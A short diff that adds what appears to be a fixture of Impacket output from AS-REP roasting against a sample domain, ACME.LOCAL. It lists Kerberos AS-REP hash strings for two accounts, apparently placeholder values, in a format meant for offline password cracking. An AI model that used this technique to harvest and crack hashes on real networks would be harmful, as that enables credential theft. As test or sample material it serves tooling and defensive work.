@@ -1,0 +1,6 @@
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting TGT for noprerequser
+$krb5asrep$23$noprerequser@ACME.LOCAL:9f8e7d6c5b4a39281706f5e4d3c2b1a0$b4c3d2e1f009182736455463728190aabbccddeeff00112233445566778899aabbccddeeff001122334455
+[*] Getting TGT for jsmith
+$krb5asrep$23$jsmith@ACME.LOCAL:1a2b3c4d5e6f708192a3b4c5d6e7f809$cc11dd22ee33ff4400556677889900aabbccddeeff112233445566778899aabbccddeeff0011
